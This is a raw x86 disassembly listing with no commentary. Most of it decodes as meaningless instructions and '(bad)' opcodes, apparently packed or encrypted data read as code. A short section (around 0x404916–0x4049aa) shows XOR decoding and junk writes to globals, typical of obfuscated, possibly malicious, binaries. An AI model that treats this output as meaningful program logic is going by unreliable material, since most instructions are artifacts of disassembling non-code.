  4041e0:	or     al,0x4e
  4041e2:	inc    edi
  4041e3:	iret   
  4041e4:	pop    es
  4041e5:	js     0x40424b
  4041e7:	dec    edi
  4041e8:	mov    ebp,0xe9695707
  4041ed:	xchg   ebp,eax
  4041ee:	cmp    esi,DWORD PTR [ebx-0x67e1ec86]
  4041f4:	push   edx
  4041f5:	mov    bh,0x33
  4041f7:	mov    dl,0xc5
  4041f9:	dec    edi
  4041fa:	add    DWORD PTR [eax],esi
  4041fc:	fs mov edi,0x206e2b9e
  404202:	pushf  
  404203:	mov    dh,0x11
  404205:	cld    
  404206:	cmp    dh,bh
  404208:	test   al,0x45
  40420a:	movd   mm4,DWORD PTR [edx-0x351b7611]
  404211:	jno    0x4041dd
  404213:	mov    al,0x2c
  404215:	mov    dl,0x13
  404217:	mov    esi,DWORD PTR [ebx+0x27]
  40421a:	push   ebp
  40421b:	das    
  40421c:	out    0x9f,al
  40421e:	add    al,0xfc
  404220:	jg     0x40425b
  404222:	add    al,0xcb
  404224:	xchg   esi,eax
  404225:	xchg   ebp,eax
  404226:	(bad)  
  404227:	mov    ebp,DWORD PTR [di-0x7a]
  40422b:	test   DWORD PTR [ebp-0x7f9462ca],ecx
  404231:	mov    ds:0xcd82b9a6,eax
  404236:	mov    WORD PTR ds:0xf883401f,gs
  40423c:	inc    eax
  40423d:	mov    DWORD PTR ds:0x42fd6e,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	bts    DWORD PTR [ebp+0x184fedbb],ecx
  40425e:	jo     0x4042d0
  404260:	cmp    eax,0x6670707d
  404265:	aam    0xa
  404267:	sub    ecx,DWORD PTR [ebp+0x1939799a]
  40426d:	push   esp
  40426e:	scas   al,BYTE PTR es:[edi]
  40426f:	inc    esp
  404270:	cmp    ah,BYTE PTR [edi+0x6f]
  404273:	adc    eax,0xb64e5d7b
  404278:	arpl   WORD PTR ds:0x810ed67e,cx
  40427e:	call   0x9f902948
  404283:	mov    eax,0xec2d8cd8
  404288:	out    dx,al
  404289:	pop    ecx
  40428a:	and    DWORD PTR [ebx+eiz*2+0x55e942fe],edi
  404291:	outs   dx,BYTE PTR ds:[esi]
  404292:	sub    al,0x28
  404294:	into   
  404295:	add    BYTE PTR [edx-0x41],0x48
  404299:	(bad)  
  40429a:	in     eax,dx
  40429b:	mov    ah,0x19
  40429d:	inc    ebx
  40429e:	frstor [eax]
  4042a0:	adc    al,0x5a
  4042a2:	icebp  
  4042a3:	mov    esp,0xbc49d48
  4042a8:	jno    0x404268
  4042aa:	and    al,0x8a
  4042ac:	xlat   BYTE PTR ds:[ebx]
  4042ad:	mov    BYTE PTR [edx],ch
  4042af:	daa    
  4042b0:	icebp  
  4042b1:	mov    ebx,0x8752a1c0
  4042b6:	into   
  4042b7:	add    DWORD PTR [ecx+0x138ccc4],edi
  4042bd:	push   0xffffffe1
  4042bf:	leave  
  4042c0:	adc    BYTE PTR [edi],cl
  4042c2:	rcr    cl,1
  4042c4:	xchg   ebx,eax
  4042c5:	retf   0xea3b
  4042c8:	jp     0x404348
  4042ca:	shl    DWORD PTR [ecx-0x24e4fcad],1
  4042d0:	jmp    0x40434a
  4042d2:	jb     0x40429a
  4042d4:	pushf  
  4042d5:	push   0xf8ca8852
  4042da:	lods   eax,DWORD PTR ds:[esi]
  4042db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042dc:	mov    esi,DWORD PTR [edx-0x5cb2ce1c]
  4042e2:	dec    edx
  4042e3:	adc    eax,DWORD PTR [eax]
  4042e5:	push   esp
  4042e6:	out    0xf1,eax
  4042e8:	ss (bad) 
  4042ea:	sub    eax,ecx
  4042ec:	mov    ah,0x35
  4042ee:	in     eax,dx
  4042ef:	push   ds
  4042f0:	shl    DWORD PTR [edx+0x447ca53d],1
  4042f6:	xchg   esi,eax
  4042f7:	push   0x446bae39
  4042fc:	iret   
  4042fd:	and    BYTE PTR [edx+0x4b6c12a4],bh
  404303:	cmp    al,0xfd
  404305:	xor    al,0xaf
  404307:	sub    edx,0xffffff90
  40430a:	rcr    DWORD PTR [ebp+0x657974d4],1
  404310:	pop    eax
  404311:	loopne 0x404326
  404313:	das    
  404314:	adc    eax,0x9c734f15
  404319:	addr16 mov ah,0x73
  40431c:	daa    
  40431d:	sub    al,0x3e
  40431f:	inc    eax
  404320:	imul   edx,DWORD PTR [edx],0xc
  404323:	mov    eax,DWORD PTR [esi]
  404325:	jae    0x404314
  404327:	mov    dl,BYTE PTR [esi-0x6e]
  40432a:	popf   
  40432b:	sbb    al,0x8e
  40432d:	inc    esi
  40432e:	inc    ebp
  40432f:	cwde   
  404330:	dec    edi
  404331:	sbb    BYTE PTR [esi-0x1],al
  404334:	(bad)  
  404335:	and    DWORD PTR [ebp-0x37564b44],edx
  40433b:	popa   
  40433c:	jns    0x404373
  40433e:	pop    ecx
  40433f:	push   0xd7c91356
  404344:	or     dl,BYTE PTR [ecx]
  404346:	jb     0x40430c
  404348:	mov    WORD PTR [edx],cs
  40434a:	lods   eax,DWORD PTR ds:[esi]
  40434b:	mov    ebp,0x9de60e0f
  404350:	adc    DWORD PTR ds:0xd4324ea0,esi
  404356:	push   eax
  404357:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404359:	shl    DWORD PTR ds:0xa633d051,1
  40435f:	sub    DWORD PTR [ebp+esi*8+0x301a0f08],eax
  404366:	stc    
  404367:	outs   dx,BYTE PTR ds:[esi]
  404368:	(bad)  
  40436a:	pop    edx
  40436b:	aad    0x1c
  40436d:	popa   
  40436e:	in     al,dx
  40436f:	in     eax,dx
  404370:	outs   dx,BYTE PTR ds:[esi]
  404371:	mov    ebx,0x1011006f
  404376:	and    DWORD PTR [ebx-0x32dbe2d3],ebx
  40437c:	ds or  al,0xa9
  40437f:	cmp    al,0xce
  404381:	popa   
  404382:	fistp  WORD PTR ds:0x42d0a4cc
  404388:	in     al,0xab
  40438a:	rol    ebx,0xf2
  40438d:	lods   al,BYTE PTR ds:[esi]
  40438e:	xchg   ecx,eax
  40438f:	scas   al,BYTE PTR es:[edi]
  404390:	fmul   DWORD PTR [esi+0x1a]
  404393:	fild   WORD PTR [edx+0x7]
  404396:	push   edx
  404397:	sub    al,0x84
  404399:	push   eax
  40439a:	mov    ch,0xfc
  40439c:	lods   al,BYTE PTR ds:[esi]
  40439d:	sub    al,0x63
  40439f:	mov    bh,0xb
  4043a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043a2:	mov    WORD PTR [edi],?
  4043a4:	jno    0x40433c
  4043a6:	xor    DWORD PTR [ecx+0x2f40bdb3],eax
  4043ac:	repnz inc edx
  4043ae:	stos   DWORD PTR es:[edi],eax
  4043af:	in     al,0xaf
  4043b1:	lods   al,BYTE PTR ds:[esi]
  4043b2:	cli    
  4043b3:	mov    ch,0xb
  4043b5:	inc    esp
  4043b6:	outs   dx,BYTE PTR ds:[esi]
  4043b7:	scas   al,BYTE PTR es:[edi]
  4043b8:	sub    esi,DWORD PTR [esi+0x7d5785b7]
  4043be:	mov    cl,0xd2
  4043c0:	aam    0xd3
  4043c2:	adc    BYTE PTR [eax],cl
  4043c4:	add    DWORD PTR [ebp-0x34],edx
  4043c7:	mov    ah,dh
  4043c9:	out    0xd4,al
  4043cb:	and    bl,bl
  4043cd:	xchg   esp,eax
  4043ce:	jae    0x40442b
  4043d0:	pusha  
  4043d1:	xor    dl,bh
  4043d3:	dec    eax
  4043d4:	push   cs
  4043d5:	sbb    BYTE PTR [edi+0x5e691641],dl
  4043db:	je     0x40435f
  4043dd:	scas   eax,DWORD PTR es:[edi]
  4043de:	or     al,0x9f
  4043e0:	call   0xa7ed:0xa75567ee
  4043e7:	icebp  
  4043e8:	adc    al,0xaf
  4043ea:	out    0x14,eax
  4043ec:	jbe    0x4043ce
  4043ee:	div    BYTE PTR [edi+ebp*1-0x6f6eb27f]
  4043f5:	xchg   esp,eax
  4043f6:	int    0x39
  4043f8:	add    eax,0xf57c36b0
  4043fd:	stc    
  4043fe:	(bad)  
  404400:	push   es
  404401:	ds and al,0xed
  404404:	adc    esp,DWORD PTR [ecx]
  404406:	jnp    0x404447
  404408:	xchg   DWORD PTR [edx+0x5],esp
  40440b:	arpl   bp,si
  40440d:	jmp    0x65b5:0x388c5996
  404414:	adc    dh,BYTE PTR [ecx-0x27388979]
  40441a:	jp     0x404490
  40441c:	test   eax,0x788e6e4d
  404421:	in     eax,dx
  404422:	xchg   edi,eax
  404423:	pusha  
  404424:	test   al,0x21
  404426:	ret    0x9e49
  404429:	push   esp
  40442a:	and    BYTE PTR [ecx],ch
  40442c:	adc    ebx,DWORD PTR [ecx-0xa]
  40442f:	mov    eax,ds:0x7f5f585f
  404434:	aaa    
  404435:	js     0x4044ac
  404437:	sbb    ah,0x73
  40443a:	test   DWORD PTR [edi-0x64],esp
  40443d:	lahf   
  40443e:	stc    
  40443f:	inc    esp
  404440:	call   0xd5008fef
  404445:	mov    ds:0xde99df0b,eax
  40444a:	jb     0x4043eb
  40444c:	test   DWORD PTR [edx+0x133343c2],esp
  404452:	xchg   DWORD PTR [eax],edx
  404454:	ins    BYTE PTR es:[edi],dx
  404455:	sbb    al,0xb7
  404457:	loopne 0x4043f1
  404459:	push   cs
  40445a:	inc    edi
  40445b:	cdq    
  40445c:	test   BYTE PTR [edi-0x4bad15ee],al
  404462:	mov    ebp,0xf9fd9141
  404467:	add    DWORD PTR [edx+edi*1-0x311f1deb],esp
  40446e:	and    DWORD PTR [edx-0x6e672070],0xb60908c7
  404478:	mov    dl,0xb5
  40447a:	xchg   edi,eax
  40447b:	xchg   BYTE PTR [eax+0x75],cl
  40447e:	ja     0x4044d0
  404480:	scas   eax,DWORD PTR es:[edi]
  404481:	xchg   ebx,eax
  404482:	xchg   ecx,eax
  404483:	mov    edx,0xd16f648b
  404488:	sbb    DWORD PTR [eax+0x2efa2c81],esp
  40448e:	adc    bh,BYTE PTR [esi+esi*8-0x68c99927]
  404495:	xchg   ecx,eax
  404496:	mov    bh,0x16
  404498:	enter  0x6619,0x1d
  40449c:	mov    bl,0xa3
  40449e:	sub    al,BYTE PTR [edi+0x1d]
  4044a1:	pushf  
  4044a2:	fs pop ebp
  4044a4:	pop    es
  4044a5:	nop
  4044a6:	pop    eax
  4044a7:	imul   esp,DWORD PTR [esi],0xffffffa1
  4044aa:	xor    BYTE PTR [esi],0xc6
  4044ad:	xchg   BYTE PTR [ecx],bl
  4044af:	ss jae 0x4044e1
  4044b2:	ror    DWORD PTR [esi],0x7e
  4044b5:	pushf  
  4044b6:	sub    DWORD PTR ds:0x669e95f8,ecx
  4044bc:	jo     0x4044b4
  4044be:	pop    esi
  4044bf:	pop    ss
  4044c0:	add    al,0xed
  4044c2:	push   ecx
  4044c3:	jne    0x40449c
  4044c5:	mov    ds:0x99d40f9a,eax
  4044ca:	mov    cl,0x80
  4044cc:	xchg   edi,eax
  4044cd:	sbb    ah,al
  4044cf:	outs   dx,DWORD PTR ds:[esi]
  4044d0:	cli    
  4044d1:	jmp    0xd4e3b299
  4044d6:	inc    esi
  4044d7:	sub    al,0x69
  4044d9:	fcomp  DWORD PTR [edi]
  4044db:	shl    BYTE PTR [eax],cl
  4044dd:	loopne 0x404484
  4044df:	pushf  
  4044e0:	es div edx
  4044e3:	mov    edi,0xa82d1af0
  4044e8:	add    DWORD PTR [eax-0x5a],ebx
  4044eb:	xor    esi,DWORD PTR [ecx+0x6d]
  4044ee:	add    eax,0xdf61fe7d
  4044f3:	daa    
  4044f4:	jb     0x404517
  4044f6:	mov    bl,0xc2
  4044f8:	(bad)  
  4044f9:	jb     0x404512
  4044fb:	mov    ds:0xd776730,eax
  404500:	lods   al,BYTE PTR ds:[esi]
  404501:	std    
  404502:	push   cs
  404503:	xchg   ebp,eax
  404504:	cmp    BYTE PTR [edx],ah
  404506:	jbe    0x40456c
  404508:	pop    ds
  404509:	jb     0x404520
  40450b:	cmp    ebx,DWORD PTR [ecx]
  40450d:	xlat   BYTE PTR ds:[ebx]
  40450e:	icebp  
  40450f:	mov    eax,ds:0x458048f8
  404514:	sbb    eax,0xb3e3514b
  404519:	push   edx
  40451a:	cwde   
  40451b:	in     eax,dx
  40451c:	sub    edx,DWORD PTR [ebx]
  40451e:	pop    ecx
  40451f:	pushf  
  404520:	sub    DWORD PTR [edx],0x27f7cb23
  404526:	fcom   DWORD PTR [esi+0x27807f12]
  40452c:	pop    ebx
  40452d:	sbb    ecx,edx
  40452f:	dec    eax
  404530:	mov    dl,ah
  404532:	and    eax,0x2aeb3c94
  404537:	pop    ds
  404538:	cmp    cl,ch
  40453a:	test   DWORD PTR [ecx+0x3c2b8388],0xb61ee119
  404544:	(bad)  
  404545:	mov    ch,0x5b
  404547:	jo     0x404530
  404549:	jmp    0x598e:0x9602561b
  404550:	cli    
  404551:	fild   QWORD PTR [ebx]
  404553:	cwde   
  404554:	add    al,0x9f
  404556:	cli    
  404557:	(bad)  
  404558:	cmp    al,0x46
  40455a:	aam    0x22
  40455c:	enter  0x7745,0x89
  404560:	mov    ah,0x8
  404562:	call   0xbcafe992
  404567:	sbb    dh,BYTE PTR [esi+ebx*4]
  40456a:	jecxz  0x40450c
  40456c:	and    DWORD PTR [ebp-0x3c90fd70],edx
  404572:	mov    WORD PTR [ecx-0x78],cs
  404575:	mov    WORD PTR [eax-0x57],fs
  404578:	popf   
  404579:	ins    BYTE PTR es:[edi],dx
  40457a:	xor    eax,0x148362d9
  40457f:	iret   
  404580:	push   ecx
  404581:	push   esp
  404582:	mov    ds:0x1af98b11,eax
  404587:	mov    gs,WORD PTR [ebx]
  404589:	cmc    
  40458a:	dec    ebx
  40458b:	xor    al,0x69
  40458d:	pop    ds
  40458e:	xchg   ebp,eax
  40458f:	mov    dl,0xaa
  404591:	(bad)  
  404592:	and    dh,bl
  404594:	sbb    eax,0xf1d08a26
  404599:	inc    esi
  40459a:	inc    esi
  40459b:	sbb    al,0xb8
  40459d:	test   BYTE PTR ds:0xbe14914c,dh
  4045a3:	inc    ebp
  4045a4:	jae    0x4045ab
  4045a6:	xor    DWORD PTR [edi],ecx
  4045a8:	adc    BYTE PTR [ecx],0xf9
  4045ab:	(bad)  
  4045ac:	jmp    DWORD PTR [ecx]
  4045ae:	adc    eax,0x42fd82
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	in     al,0x33
  4045c9:	dec    edi
  4045ca:	jne    0x4045d8
  4045cc:	and    al,0x70
  4045ce:	jo     0x40460d
  4045d0:	jge    0x404642
  4045d2:	jo     0x404636
  4045d4:	push   edi
  4045d5:	test   al,0x93
  4045d7:	not    DWORD PTR [edx]
  4045d9:	or     edx,DWORD PTR [edi+0x25]
  4045dc:	sahf   
  4045dd:	loopne 0x404589
  4045df:	aaa    
  4045e0:	mov    ebx,0xbc5c33
  4045e5:	add    BYTE PTR [eax],ah
  4045e7:	gs mov edx,0x4c663edf
  4045ed:	inc    ebp
  4045ee:	jbe    0x404607
  4045f0:	call   FWORD PTR [edi-0x27]
  4045f3:	call   DWORD PTR [edx-0x22d0cca4]
  4045f9:	sbb    ch,BYTE PTR [esi-0x1b]
  4045fc:	dec    ebp
  4045fd:	cmp    esp,DWORD PTR [ebx-0x7f]
  404600:	jmp    0x404658
  404602:	cli    
  404603:	aam    0x14
  404605:	fsubr  QWORD PTR [ecx]
  404607:	fcmovnu st,st(4)
  404609:	xor    eax,esi
  40460b:	pop    esi
  40460c:	les    edx,FWORD PTR [eax-0x755384e]
  404612:	sub    eax,0x951cb499
  404617:	pop    esi
  404618:	adc    eax,0x8355b99a
  40461d:	aam    0xca
  40461f:	adc    eax,0xfa542ac
  404624:	pop    edx
  404625:	add    eax,0xa0bfda37
  40462a:	and    eax,0xc9dde1a0
  40462f:	leave  
  404630:	pop    ds
  404631:	aaa    
  404632:	mov    al,ds:0x36c66b8d
  404637:	inc    ebx
  404638:	add    BYTE PTR [esp+ebp*2-0x27],cl
  40463c:	mov    al,0x59
  40463e:	dec    ecx
  40463f:	adc    al,0x7e
  404641:	mov    ebp,0x51fec5aa
  404646:	addr16 inc ebx
  404648:	add    BYTE PTR [edi-0x28],dh
  40464b:	jno    0x404699
  40464d:	dec    esp
  40464e:	nop
  40464f:	les    esi,FWORD PTR [ebp+ebx*1+0x5d]
  404653:	int    0x7b
  404655:	(bad)  
  404656:	mov    dh,0x4d
  404658:	sbb    BYTE PTR [edi-0x64],ah
  40465b:	dec    edx
  40465c:	ja     0x40465a
  40465e:	pop    ss
  40465f:	out    dx,eax
  404660:	push   es
  404661:	test   eax,0xef161ba4
  404666:	in     al,dx
  404667:	rcr    al,0xe0
  40466a:	dec    ecx
  40466b:	add    bh,BYTE PTR [ebx+eiz*4+0x48728dae]
  404672:	cld    
  404673:	sbb    bl,al
  404675:	push   ebp
  404676:	jnp    0x40466d
  404678:	lods   al,BYTE PTR ds:[esi]
  404679:	retf   0xa211
  40467c:	fcom   st(1)
  40467e:	arpl   WORD PTR [edx+0x10],sp
  404681:	xlat   BYTE PTR ds:[ebx]
  404682:	cmp    DWORD PTR [esi+0x46],ecx
  404685:	push   edx
  404686:	or     ah,bl
  404688:	xlat   BYTE PTR ds:[ebx]
  404689:	push   0x82204c08
  40468e:	loopne 0x404691
  404690:	cdq    
  404691:	xor    BYTE PTR [esi+0x63f5435d],al
  404697:	cmp    edi,DWORD PTR [edx+edi*1-0x6d]
  40469b:	jno    0x40463b
  40469d:	jne    0x404621
  40469f:	sahf   
  4046a0:	shr    DWORD PTR [ebx+eax*8-0x36],cl
  4046a4:	dec    eax
  4046a5:	mov    edi,0xbb04ac8e
  4046aa:	ss out 0xd7,al
  4046ad:	adc    esp,DWORD PTR [edx+0x3d34918a]
  4046b3:	and    eax,0x99c84046
  4046b8:	bnd jle 0x4046c4
  4046bb:	mov    dl,0x6
  4046bd:	lods   eax,DWORD PTR ds:[esi]
  4046be:	xor    ch,BYTE PTR [edi+0x42]
  4046c1:	pop    es
  4046c2:	xchg   esi,eax
  4046c3:	(bad)  
  4046c4:	push   ebp
  4046c5:	aas    
  4046c6:	mov    eax,0xa1b224a9
  4046cb:	adc    bl,BYTE PTR [esi-0x472f7361]
  4046d1:	mov    al,ds:0xd5c17439
  4046d6:	xchg   esp,eax
  4046d7:	lds    edx,FWORD PTR [eax-0xc50a02a]
  4046dd:	iret   
  4046de:	cmp    al,0xe6
  4046e0:	dec    edx
  4046e1:	adc    al,0x48
  4046e3:	(bad)  
  4046e4:	or     BYTE PTR [edx-0x5e],dh
  4046e7:	dec    ecx
  4046e8:	inc    ebp
  4046e9:	in     al,0x7b
  4046eb:	adc    edx,DWORD PTR [ebp-0x3340996]
  4046f1:	pop    ecx
  4046f2:	daa    
  4046f3:	mov    al,ds:0x843da086
  4046f8:	xlat   BYTE PTR ds:[ebx]
  4046f9:	inc    ebx
  4046fa:	or     al,dh
  4046fc:	fmul   QWORD PTR [eax+0x2219dcb7]
  404702:	sbb    DWORD PTR [edi-0xafa0c3b],ebp
  404708:	push   ebp
  404709:	xchg   edi,eax
  40470a:	or     ah,BYTE PTR [ebx]
  40470c:	and    DWORD PTR [ebx],ebp
  40470e:	or     dl,BYTE PTR [ebp+0x580792cd]
  404714:	add    edi,eax
  404716:	mov    bh,0x5d
  404718:	stos   BYTE PTR es:[edi],al
  404719:	popa   
  40471a:	add    edx,DWORD PTR [ebp+0x671601d1]
  404720:	inc    esi
  404721:	lea    esi,[ebx+0x7c84e0d]
  404727:	cli    
  404728:	cmp    al,0x3d
  40472a:	cwde   
  40472b:	lods   eax,DWORD PTR ds:[esi]
  40472c:	cmp    al,0xf6
  40472e:	jle    0x404758
  404730:	mov    ah,0x41
  404732:	icebp  
  404733:	xor    DWORD PTR [eax],edx
  404735:	mov    esp,0xe78358dc
  40473a:	shr    DWORD PTR [esi+edx*2-0x14cc4f5e],cl
  404741:	fbld   TBYTE PTR [edx-0x6b]
  404744:	sbb    eax,ebx
  404746:	xor    eax,DWORD PTR [edi+ecx*8+0x65]
  40474a:	push   ebp
  40474b:	inc    ebx
  40474c:	das    
  40474d:	cmp    BYTE PTR [ebx*2+0x4edfbdcd],bh
  404754:	test   eax,0xe81b6259
  404759:	(bad)  
  40475a:	imul   ebx,DWORD PTR [ecx+0x4d],0x21
  40475e:	leave  
  40475f:	xchg   BYTE PTR [edi],al
  404761:	mov    al,ds:0x27ceca8e
  404766:	sti    
  404767:	cmc    
  404768:	mov    DWORD PTR [edi+0x6],esi
  40476b:	mov    ebx,0xacb9a341
  404770:	push   ebp
  404771:	push   edi
  404772:	retf   0xd644
  404775:	pop    ebp
  404776:	push   esp
  404777:	pop    esi
  404778:	addr16 push ebx
  40477a:	mov    esi,0x740884dd
  40477f:	ret    0xc3dd
  404782:	add    al,bh
  404784:	dec    esi
  404785:	dec    dl
  404787:	or     bh,ch
  404789:	ret    0x6559
  40478c:	dec    ebx
  40478d:	lock popa 
  40478f:	sub    eax,0x4d8248eb
  404794:	jl     0x4047bc
  404796:	mov    ah,ch
  404798:	pop    edx
  404799:	pop    ebp
  40479a:	(bad)  [ebp-0x7e]
  40479d:	jecxz  0x40476e
  40479f:	dec    esi
  4047a0:	sbb    edx,esp
  4047a2:	int    0x50
  4047a4:	dec    eax
  4047a5:	xor    al,0xfa
  4047a7:	inc    edi
  4047a8:	mov    ds:0xd678f26b,eax
  4047ad:	sbb    al,0x22
  4047af:	dec    edi
  4047b0:	scas   al,BYTE PTR es:[edi]
  4047b1:	rcr    BYTE PTR [ebp+0x460cb3ab],0xbc
  4047b8:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4047ba:	iret   
  4047bb:	bound  ebp,QWORD PTR [esi+0x58eab79d]
  4047c1:	add    eax,0x180bcc75
  4047c6:	cli    
  4047c7:	sub    eax,0x768c771
  4047cc:	fs out dx,eax
  4047ce:	mov    ds:0xcc2dcf22,al
  4047d3:	fdiv   QWORD PTR [eax]
  4047d5:	aas    
  4047d6:	mov    eax,ds:0xa8d9dbe2
  4047db:	dec    ecx
  4047dc:	jp     0x4047fd
  4047de:	mov    BYTE PTR [ebx],dl
  4047e0:	add    al,0x64
  4047e2:	into   
  4047e3:	loopne 0x40477c
  4047e5:	xor    DWORD PTR [edi+esi*4+0x57],ebx
  4047e9:	fstp   QWORD PTR [ebx-0x1d]
  4047ec:	dec    ebp
  4047ed:	nop
  4047ee:	mov    eax,ds:0x854f4204
  4047f3:	std    
  4047f4:	jno    0x404790
  4047f6:	retf   0x98be
  4047f9:	and    eax,edx
  4047fb:	adc    edx,DWORD PTR [ebp-0x5e]
  4047fe:	nop
  4047ff:	gs xor cl,dh
  404802:	mov    BYTE PTR [edi-0x766570ba],0x5b
  404809:	pop    edi
  40480a:	out    0x14,eax
  40480c:	icebp  
  40480d:	fidiv  DWORD PTR [edx+0x968c2ed]
  404813:	or     eax,0x8ac98bab
  404818:	out    0xe8,al
  40481a:	fs lahf 
  40481c:	test   al,0x5
  40481e:	fidivr DWORD PTR ds:0xb6653a9d
  404824:	mov    dl,0x4
  404826:	inc    ebp
  404827:	clc    
  404828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404829:	mov    esp,edi
  40482b:	sbb    eax,0x8f18c35f
  404830:	into   
  404831:	pop    esp
  404832:	(bad)
  404836:	pop    ds
  404837:	pop    eax
  404838:	mov    ds:0x313a9fc3,al
  40483d:	lods   eax,DWORD PTR ds:[esi]
  40483e:	inc    edi
  40483f:	clc    
  404840:	icebp  
  404841:	xchg   edx,eax
  404842:	repz and DWORD PTR [ebx-0x307b0cc0],edi
  404849:	add    edi,eax
  40484b:	in     eax,0x8f
  40484d:	xor    dl,bh
  40484f:	cs pushf 
  404851:	(bad)  
  404852:	ds and eax,0x63bcffb9
  404858:	in     eax,dx
  404859:	cmp    WORD PTR [ecx+eiz*4],sp
  40485d:	inc    ecx
  40485e:	xor    ax,0x7ca1
  404862:	in     eax,dx
  404863:	or     BYTE PTR [edi+0x7b],dl
  404866:	jno    0x4048a6
  404868:	cwde   
  404869:	jno    0x404800
  40486b:	dec    ecx
  40486c:	push   0xffffffce
  40486e:	popa   
  40486f:	jne    0x40483d
  404871:	jmp    0xe7ab2aa9
  404876:	and    DWORD PTR [edx],edi
  404878:	out    dx,eax
  404879:	cmp    ecx,edx
  40487b:	fcomp  st(3)
  40487d:	iret   
  40487e:	cld    
  40487f:	retf   
  404880:	std    
  404881:	out    dx,al
  404882:	pop    ebx
  404883:	mov    ah,0x5d
  404885:	sbb    bh,cl
  404887:	cmp    edx,ebx
  404889:	mov    cs,eax
  40488b:	cmp    ebp,DWORD PTR [edi]
  40488d:	pop    esi
  40488e:	std    
  40488f:	mov    eax,0xc6ccff71
  404894:	xchg   esi,eax
  404895:	jo     0x404831
  404897:	out    0x1,eax
  404899:	mov    edi,0x271b7311
  40489e:	outs   dx,DWORD PTR ds:[esi]
  40489f:	pop    esi
  4048a0:	and    bh,BYTE PTR [ebp-0x53]
  4048a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048a4:	sub    eax,0x77216c24
  4048a9:	push   ds
  4048aa:	mov    ebp,0xcebebe
  4048af:	std    
  4048b0:	lds    edi,FWORD PTR [eax]
  4048b2:	out    0x3f,al
  4048b4:	je     0x4048e3
  4048b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048b7:	std    
  4048b8:	push   ebp
  4048b9:	xchg   BYTE PTR [ecx+0x6c881ef4],bh
  4048bf:	and    ch,ah
  4048c1:	cwde   
  4048c2:	rol    DWORD PTR [edx],1
  4048c4:	xlat   BYTE PTR ds:[ebx]
  4048c5:	xchg   ebp,eax
  4048c6:	pop    ebp
  4048c7:	pop    esp
  4048c8:	adc    ch,BYTE PTR [edi-0x7f]
  4048cb:	mov    eax,0x7cdc27c3
  4048d0:	fdivr  DWORD PTR [ecx]
  4048d2:	fisubr DWORD PTR [ecx-0x4e]
  4048d5:	xchg   ebx,eax
  4048d6:	mov    ecx,0xcf4081b2
  4048db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048dc:	mov    esp,0x58d46f46
  4048e1:	aam    0xba
  4048e3:	or     DWORD PTR [edx],ebp
  4048e5:	mov    edx,0xf06db8d
  4048ea:	push   es
  4048eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048ec:	stos   DWORD PTR es:[edi],eax
  4048ed:	das    
  4048ee:	jae    0x404924
  4048f0:	add    eax,0x616ebf42
  4048f5:	neg    edi
  4048f7:	and    al,0xc2
  4048f9:	hlt    
  4048fa:	jo     0x4048d1
  4048fc:	je     0x4048aa
  4048fe:	repnz cli 
  404900:	or     dl,BYTE PTR [ebx+esi*2+0x54944a62]
  404907:	push   esi
  404908:	jo     0x40490b
  40490a:	rol    dh,cl
  40490c:	ror    BYTE PTR [edi],cl
  40490e:	sbb    cl,BYTE PTR [ebp-0x1fa65760]
  404914:	dec    ebp
  404915:	xchg   ebx,eax
  404916:	mov    eax,DWORD PTR [ebp-0xc]
  404919:	xor    edx,ecx
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e11c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e124,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e6ff,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e134,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fd05,0x42e134
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fd7a,0x42fcf9
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fd7e,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e703,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fd82,0x42fd7e
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e707,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	mov    al,ds:0xc979c218
  4049c0:	and    DWORD PTR [eax+0x70],esi
  4049c3:	cmp    eax,0x2370707d
  4049c8:	daa    
  4049c9:	out    0x14,al
  4049cb:	jmp    0x4049ba
  4049cd:	mov    ds:0xc35c1fce,eax
  4049d2:	adc    eax,0x260fe621
  4049d7:	xchg   ebx,eax
  4049d8:	mov    al,ds:0x8f7116c
  4049dd:	inc    edx
  4049de:	sub    eax,0x1b718dc0
  4049e3:	lds    ebx,FWORD PTR [edx]
  4049e5:	into   
  4049e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049e7:	ds retf 0xae4c
  4049eb:	(bad)  
  4049ec:	push   edi
  4049ed:	adc    al,0xb8
